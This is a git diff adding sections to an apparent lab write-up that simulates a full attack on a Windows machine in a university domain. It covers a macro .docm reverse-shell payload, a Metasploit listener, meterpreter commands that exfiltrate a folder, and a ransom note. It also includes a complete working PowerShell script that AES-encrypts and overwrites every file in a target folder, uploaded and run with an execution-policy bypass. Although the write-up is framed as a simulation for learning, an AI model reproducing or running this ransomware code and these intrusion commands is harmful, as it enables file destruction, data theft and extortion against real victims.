@@ -108,11 +108,12 @@ macro_pack.exe -f reverse_shell_exploit.vba -o -G malicious.docm
 ## Spearphishing
 Once the adversary was able to generate the payload `malicious.docm`, he needs to inject it into the victim's environment. I tried to perform a Spoofed Spearphishing Attack using [The Social-Engineer Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit) and replicating the `units.it` domain using [hMailServer]( https://www.hmailserver.com), but there were compatibility issues as stated [here](https://github.com/trustedsec/social-engineer-toolkit/issues/810).<br/>
 Therefore I assumed that the adversary was able to obtain **Valid Credentials** for one **Domain Account** of the `units.it` domain, so it was indeed able to send the required Spearphishing Attachment to the victim.
+
 ![Photo of Mountain](images/mountain.jpg)
 
 <br/>
 
-## Exfiltration & Impact
+## Initial Access & Execution
 In order to be able to have a **reverse shell** at the victim's side connected to a remote shell client at the adversary's side, the attacker needs to launch a **listener** (prior to the opening of the `malicious.docm` payload).<br/>
 To do so, I have created a handler configuration file for `metasploit`, namely `handler.rc`, to instruct it to listen at port `4444` for TCP connections:
 ```
@@ -134,7 +135,93 @@ Then the listener is launched using the command
 ```
 msfconsole -q -r handler.rc
 ```
+When the victim opens the `malicious.docm` payload, the VBA Script will attempt to open a TCP connection to the adversary-controlled listener, by continuously migrating among processes running on the victim's machine, or by spawning new ones, until a TCP connection is successfully established.
 
-> Note: Example page content from [GetGrav.org](https://learn.getgrav.org/17/content/markdown), included to demonstrate the portability of Markdown-based content
+<br/>
 
-[^1]: [Markdown - John Gruber](https://daringfireball.net/projects/markdown/)
+## Exfiltration
+From the remote shell client, the adversary can now move around the victim's File System. Depending on the privilege level and access rights the adversary is able to obtain on the victim's environment, the attacker might not be able to access all resources. I assumed that critical resources where inside the `C:\\Users\\enrico\\Desktop\\Very_Important_Stuff\\` directory, so the adversary can exfiltrate all contained files by executing
+```
+download -r C:\\Users\\enrico\\Desktop\\Very_Important_Stuff\\ /home/kali/Desktop/Exfiltrated
+```
+
+<br/>
+
+## Impact
+To compromise the integrity of the exfiltrated files in order to make them unusable by the victims, I have created this powershell script
+```powershell
+# AES Encryption Ransomware Simulation Script
+
+# Generate a random AES encryption key and IV
+$key = New-Object byte[] 32
+[Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($key)
+
+$iv = New-Object byte[] 16
+[Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($iv)
+
+# Save the encryption key and IV to a file
+$keyFile = "C:\Users\enrico\Documents\encryption_key.bin"
+[System.IO.File]::WriteAllBytes($keyFile, $key)
+
+# Function to encrypt one file
+function Encrypt-File {
+    param (
+        [string]$filePath
+    )
+    try {
+        # Read file content
+        $fileContent = Get-Content -Path $filePath -Raw -ErrorAction Stop
+
+        # Convert content to bytes
+        $fileBytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
+
+        # Create AES encryption object
+        $aes = [System.Security.Cryptography.Aes]::Create()
+        $aes.Key = $key
+        $aes.IV = $iv
+        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+
+        # Encrypt file content
+        $encryptor = $aes.CreateEncryptor()
+        $encryptedBytes = $encryptor.TransformFinalBlock($fileBytes, 0, $fileBytes.Length)
+
+        # Overwrite the original file with encrypted content
+        [System.IO.File]::WriteAllBytes($filePath, $encryptedBytes)
+
+        Write-Host "Encrypted: $filePath"
+    } catch {
+        Write-Host "Failed to encrypt: $filePath - $_"
+    }
+}
+
+# Target folder for encryption
+$targetFolder = "C:\Users\enrico\Desktop\Very_Important_Stuff"
+
+# Encrypt all files in the target folder
+Get-ChildItem -Path $targetFolder -File -Recurse | ForEach-Object {
+    Encrypt-File -filePath $_.FullName
+}
+
+Write-Host "Encryption complete. Files are now unreadable."
+```
+This script needs to be uploaded into an adversary-chosen location using
+```
+upload /home/kali/Desktop/encrypt.ps1 C:\\Users\\enrico\\Documents\\encrypt.ps1
+```
+and then executed
+```
+execute -f powershell.exe -a "-ExecutionPolicy Bypass -File C:\\Users\\enrico\\Documents\\encrypt.ps1"
+```
+To inform the victim of the compromise and demand a ransom, I leave the following message as a `README.txt` file inside the disrupted folder:
+```
+execute -f cmd.exe -a "/c echo Your files have been encrypted. Contact your.worst.enemy@pj5.w49ol.ru to recover them. > C:\\Users\\enrico\\Documents\\README.txt"
+```
+
+<br/>
+
+## Credits
+- I have taken inspiration for this attack by following [Lockard Security](https://www.youtube.com/@lockardsecurity/videos) Youtube channel.
+- I have followed [this](https://www.youtube.com/watch?v=UTd8mL2itUo) tutorial for installing Microsoft Word LTSC 2021 on the Windows 10 VM.
+- The setup of the custom SMTP Server was based on a [SMTP Server setup guide](https://mailtrap.io/blog/setup-smtp-server/) of the [Mailtrap](https://mailtrap.io/blog/) blog.
+- I have learnt how to write en encryption script in Powershell essentially by following [PoshCodex](https://www.poshcodex.co.uk/) and, in particular, the [Part 1](https://www.poshcodex.co.uk/2024/11/14/powershell-working-with-aes-encryption-part-1/) and [Part 2](https://www.poshcodex.co.uk/2024/12/07/powershell-working-with-aes-encryption-part-2/) of the "Powershell: Working with AES encryption" blog post.
